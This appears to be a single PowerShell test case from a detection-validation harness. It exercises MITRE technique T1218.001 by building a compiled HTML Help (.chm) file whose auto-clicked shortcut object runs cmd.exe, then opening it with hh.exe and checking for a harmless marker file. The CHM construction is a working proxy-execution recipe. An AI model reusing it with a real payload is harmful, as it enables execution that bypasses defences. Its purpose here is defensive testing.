Invoke-A36Test -Id 'i6' -Technique 'T1218.001' -Telemetry @('sysmon:1', 'sec:4688') -Summary 'hh.exe (Microsoft HTML Help) opens a local .chm whose shortcut object runs cmd.exe (T1218.001)' -Attempt {
  $hh = Join-Path $env:SystemRoot 'hh.exe'
  if (-not (Test-Path -LiteralPath $hh)) { return @{ Ran = $false; Note = 'hh_missing'; NotApplicable = 'hh.exe is not present on this host' } }
  $mk = Join-Path $script:A36Work 'chm-marker.txt'
  $hhc = Join-Path $script:A36Work 'help.hhc'
  $q = [string][char]34
  $cmdLine = 'cmd.exe,/c echo ' + $script:A36Marker + ' > ' + $q.Replace('"', [string][char]92 + $q) + $mk + $q.Replace('"', [string][char]92 + $q)
  $body = '<HTML><BODY><OBJECT id="x" type="application/x-oleobject" classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11"><PARAM name="Command" value="ShortCut"><PARAM name="Button" value="Bitmap::shortcut"><PARAM name="Item1" value="' + $cmdLine + '"><PARAM name="Item2" value="273,1,1"></OBJECT><SCRIPT>x.Click();</SCRIPT></BODY></HTML>'
  $htm = Join-Path $script:A36Work 'help.htm'
  Set-Content -LiteralPath $htm -Value $body -Encoding ASCII
  $chm = Join-Path $script:A36Work 'help.chm'
  $hcc = Join-Path $env:SystemRoot 'System32\hhc.exe'
  $built = $false
  if (Test-Path -LiteralPath $hcc) {
    $proj = Join-Path $script:A36Work 'help.hhp'
    Set-Content -LiteralPath $proj -Encoding ASCII -Value @('[OPTIONS]', ('Compiled file=' + $chm), ('Default topic=help.htm'), '[FILES]', 'help.htm')
    [void](Invoke-A36Proc -File $hcc -ArgLine ('"' + $proj + '"') -TimeoutSec 20 -NoShell)
    $built = Test-Path -LiteralPath $chm
  }
  if (-not $built) { return @{ Ran = $false; Note = 'hhc_compiler_unavailable'; NotApplicable = 'the HTML Help compiler (hhc.exe) is not present, so a .chm could not be built on this host' } }
  $p = Invoke-A36Proc -File $hh -ArgLine ('"' + $chm + '"') -TimeoutSec 20
  for ($i = 0; $i -lt 15 -and -not (Test-A36Marker $mk); $i++) { Start-Sleep -Milliseconds 300 }
  try { Get-CimInstance Win32_Process -Filter "Name='hh.exe'" -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -like ('*' + $script:A36Tag + '*') } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue } } catch {}
  return @{ Ran = (Test-A36Marker $mk); Note = "chm_compiled=$built hh_started=$($p.Started) shortcut_object_fired=$(Test-A36Marker $mk)"; NotApplicable = '' }
}
